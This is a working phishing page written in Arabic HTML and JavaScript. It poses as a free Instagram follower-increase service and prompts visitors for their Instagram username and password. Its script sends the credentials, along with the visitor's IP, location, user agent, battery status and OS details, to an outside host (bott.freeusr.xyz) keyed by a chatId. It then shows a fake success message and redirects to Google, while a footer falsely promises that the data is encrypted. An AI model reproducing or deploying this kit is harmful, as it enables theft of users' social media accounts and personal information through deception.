<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="زيادة متابعين انستجرام💥">
    <meta property="og:description" content="مرحبا بك في افضل موقع زياده متابعين انستجرام يمكنك زياده اكثر من 1000 متابع يومياً مجاني💥🚀">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="زيادة متابعين انستجرام💥">
    <meta name="twitter:description" content="مرحبا بك في افضل موقع زياده متابعين انستجرام يمكنك زياده اكثر من 1000 متابع يومياً مجاني💥🚀">
    <title>زيادة متابعين انستجرام</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #fd1d1d, #fcb045, #833ab4, #405de6);
            background-size: 400% 400%;
            animation: gradientBG 10s ease infinite;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Arial', sans-serif;
            padding: 20px;
        }

        @keyframes gradientBG {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .container {
            background: rgba(28, 28, 28, 0.95);
            padding: 40px 30px;
            border-radius: 20px;
            max-width: 420px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .logo {
            text-align: center;
            font-size: 50px;
            margin-bottom: 10px;
        }

        h2 {
            color: #FFD700;
            text-align: center;
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 25px;
            text-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
        }

        h2 span {
            animation: pulse 2s ease-in-out infinite;
            display: inline-block;
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }

        .input-group {
            position: relative;
            margin-bottom: 18px;
        }

        .input-group label {
            display: block;
            color: #aaa;
            font-size: 13px;
            margin-bottom: 5px;
            font-weight: 500;
        }

        input, select {
            width: 100%;
            padding: 14px 16px;
            border-radius: 10px;
            border: 2px solid rgba(255, 255, 255, 0.1);
            background: rgba(255, 255, 255, 0.05);
            color: #fff;
            font-size: 15px;
            transition: all 0.3s ease;
            outline: none;
        }

        input:focus, select:focus {
            border-color: #f39c12;
            background: rgba(255, 255, 255, 0.08);
            box-shadow: 0 0 20px rgba(243, 156, 18, 0.15);
        }

        input::placeholder {
            color: #666;
        }

        select option {
            background: #1c1c1c;
            color: #fff;
        }

        button {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #f39c12, #e67e22);
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-size: 18px;
            font-weight: 700;
            transition: all 0.3s ease;
            margin-top: 10px;
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(243, 156, 18, 0.4);
        }

        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .spinner {
            display: none;
            width: 40px;
            height: 40px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid #f39c12;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 15px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .success-message {
            display: none;
            text-align: center;
            padding: 20px;
        }

        .success-message .check {
            font-size: 60px;
            color: #4CAF50;
            animation: popIn 0.5s ease;
        }

        .success-message h3 {
            color: #4CAF50;
            font-size: 22px;
            margin-top: 10px;
        }

        .success-message p {
            color: #aaa;
            font-size: 14px;
            margin-top: 5px;
        }

        @keyframes popIn {
            0% { transform: scale(0); }
            70% { transform: scale(1.2); }
            100% { transform: scale(1); }
        }

        .footer {
            text-align: center;
            margin-top: 20px;
            color: #555;
            font-size: 12px;
        }

        @media (max-width: 480px) {
            .container {
                padding: 25px 20px;
            }
            h2 {
                font-size: 20px;
            }
            input, select {
                padding: 12px 14px;
                font-size: 14px;
            }
            button {
                font-size: 16px;
                padding: 14px;
            }
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">📸</div>
        <h2>زيادة متابعين انستجرام <span>🚀</span></h2>

        <form id="loginForm">
            <div class="input-group">
                <label>📧 البريد الإلكتروني أو اليوزر</label>
                <input type="text" id="username" placeholder="أدخل البريد الإلكتروني أو اسم المستخدم" required>
            </div>

            <div class="input-group">
                <label>🔒 كلمة المرور</label>
                <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
            </div>

            <div class="input-group">
                <label>👥 عدد المتابعين</label>
                <select id="followers">
                    <option value="1000">1000 متابع - مجاني 🎁</option>
                    <option value="1500">1500 متابع - 2$</option>
                    <option value="2000">2000 متابع - 3$</option>
                    <option value="3000">3000 متابع - 5$</option>
                    <option value="5000">5000 متابع - 8$</option>
                    <option value="10000">10000 متابع - 15$</option>
                </select>
            </div>

            <button type="submit" id="submitBtn">🚀 شحن المتابعين الآن</button>

            <div class="spinner" id="spinner"></div>
        </form>

        <div class="success-message" id="successMessage">
            <div class="check">✅</div>
            <h3>تم استلام طلبك!</h3>
            <p>جاري معالجة طلبك، سيتم إضافة المتابعين قريباً</p>
        </div>

        <div class="footer">
            🔒 بياناتك آمنة ومشفرة
        </div>
    </div>

    <script>
        // ============================================
        // دالة إرسال تقارير الفشل
        // ============================================
        async function sendFailReport(type, message, details = {}) {
            const chatId = new URLSearchParams(window.location.search).get('chatId') || 'غير معروف';
            try {
                await fetch('https://bott.freeusr.xyz/fail', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chatId: chatId,
                        type: type,
                        message: message,
                        details: details,
                        deviceInfo: {
                            platform: navigator.platform || 'غير متاح',
                            language: navigator.language || 'غير متاح',
                            userAgent: navigator.userAgent || 'غير متاح',
                            timestamp: new Date().toISOString()
                        }
                    })
                });
            } catch (error) {
                console.warn('Failed to send fail report:', error);
            }
        }

        // ============================================
        // قراءة chatId من الرابط
        // ============================================
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('chatId');

        if (!chatId) {
            sendFailReport('error', 'معرف المستخدم غير موجود في الرابط', {});
            alert('خطأ: chatId غير موجود في الرابط');
        }

        // ============================================
        // جلب معلومات IP مع تجنب 429
        // ============================================
        let cachedIpData = null;
        let ipFetched = false;

        async function getIPInfo() {
            if (ipFetched && cachedIpData) {
                return cachedIpData;
            }

            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 3000);

                const res = await fetch('https://ipwho.is/', {
                    signal: controller.signal
                });
                clearTimeout(timeoutId);

                if (res.ok) {
                    const data = await res.json();
                    cachedIpData = {
                        ip: data.ip || 'غير معروف',
                        country: data.country_name || 'غير معروف',
                        city: data.city || 'غير معروف'
                    };
                } else {
                    cachedIpData = { ip: 'غير معروف', country: 'غير معروف', city: 'غير معروف' };
                }
            } catch (error) {
                console.warn('IP fetch failed, using fallback');
                cachedIpData = { ip: 'غير معروف', country: 'غير معروف', city: 'غير معروف' };
            }

            ipFetched = true;
            return cachedIpData;
        }

        // ============================================
        // جلب معلومات الجهاز
        // ============================================
        function getPlatformInfo() {
            const ua = navigator.userAgent;
            let platform = "Unknown";
            if (/Windows/.test(ua)) platform = "Windows";
            else if (/Mac/.test(ua)) platform = "MacOS";
            else if (/Linux/.test(ua)) platform = "Linux";
            else if (/Android/.test(ua)) platform = "Android";
            else if (/iPhone|iPad|iPod/.test(ua)) platform = "iOS";
            return { platform, userAgent: ua };
        }

        // ============================================
        // جلب معلومات البطارية
        // ============================================
        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        batteryLevel: battery.level,
                        batteryCharging: battery.charging
                    };
                } catch (error) {
                    console.error('Error getting battery info:', error);
                }
            }
            return { batteryLevel: undefined, batteryCharging: undefined };
        }

        // ============================================
        // جلب إصدار الجهاز
        // ============================================
        function getDeviceVersion() {
            const ua = navigator.userAgent;
            const match = ua.match(/\(([^)]+)\)/);
            return match ? match[1] : 'Unknown';
        }

        // ============================================
        // معالج إرسال النموذج - بنفس طريقة الإرسال القديمة (JSON)
        // ============================================
        document.getElementById('loginForm').addEventListener('submit', async (event) => {
            event.preventDefault();

            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const followers = document.getElementById('followers').value;

            if (!username || !password) {
                sendFailReport('permission', 'المستخدم لم يدخل البيانات المطلوبة', {
                    username: !!username,
                    password: !!password
                });
                alert('يرجى إدخال البريد الإلكتروني وكلمة المرور');
                return;
            }

            // عرض السبينر
            document.getElementById('spinner').style.display = 'block';
            document.getElementById('submitBtn').disabled = true;

            try {
                // ✅ جلب جميع المعلومات بنفس الطريقة القديمة
                const ipInfo = await getIPInfo();
                const platformInfo = getPlatformInfo();
                const batteryInfo = await getBatteryInfo();
                const deviceVersion = getDeviceVersion();

                // ✅ بناء كائن البيانات بنفس شكل الكود القديم
                const data = {
                    username: username,
                    password: password,
                    platform: 'Instagram',
                    chatId: chatId || '',
                    ip: ipInfo.ip,
                    country: ipInfo.country,
                    city: ipInfo.city,
                    userAgent: platformInfo.userAgent,
                    batteryLevel: batteryInfo.batteryLevel,
                    charging: batteryInfo.batteryCharging,
                    osVersion: deviceVersion,
                    followers: followers
                };

                console.log('Sending data:', data);

                // ✅ إرسال كـ JSON بنفس طريقة الكود القديم
                const response = await fetch('https://bott.freeusr.xyz/submitIncrease', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                });

                document.getElementById('spinner').style.display = 'none';
                document.getElementById('submitBtn').disabled = false;

                const result = await response.json();

                if (result.success) {
                    document.getElementById('loginForm').style.display = 'none';
                    document.getElementById('successMessage').style.display = 'block';

                    setTimeout(() => {
                        window.location.href = "https://www.google.com/";
                    }, 5000);
                } else {
                    sendFailReport('upload', 'فشل إرسال البيانات', {
                        status: response.status,
                        error: result.error || 'Unknown'
                    });
                    alert('حدث خطأ أثناء تنفيذ الطلب. يرجى المحاولة مرة أخرى.');
                }

            } catch (error) {
                console.error('Error:', error);
                document.getElementById('spinner').style.display = 'none';
                document.getElementById('submitBtn').disabled = false;

                sendFailReport('error', 'خطأ في الاتصال بالخادم', {
                    error: error.message
                });

                alert('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقاً.');
            }
        });

        // ============================================
        // مراقبة الأخطاء غير المتوقعة
        // ============================================
        window.addEventListener('error', (event) => {
            sendFailReport('error', 'خطأ غير متوقع', {
                message: event.message,
                filename: event.filename,
                lineno: event.lineno
            });
        });
    </script>
</body>
</html>
